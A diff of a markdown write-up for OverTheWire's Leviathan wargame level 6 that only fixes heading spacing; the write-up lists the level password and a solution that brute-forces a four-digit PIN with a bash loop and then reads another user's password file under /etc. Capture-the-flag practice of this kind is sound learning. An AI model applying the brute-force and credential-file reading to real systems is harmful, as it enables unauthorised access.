@@ -1,4 +1,4 @@
-###Leviathan Level 6
+### Leviathan Level 6
 
 [Leviathan6](http://overthewire.org/wargames/leviathan/leviathan6.html)
 
@@ -7,14 +7,14 @@
 **Password**: *UgaoFee4li*
 
 
-###Solution
+### Solution
 ```bash
 for i in {0000..9999}; do ./leviathan6 $i; done
 cat /etc/leviathan_pass/leviathan7
 ```
 
 
-####Credentials for Level 7
+#### Credentials for Level 7
 
 **Username**: *leviathan7*
 
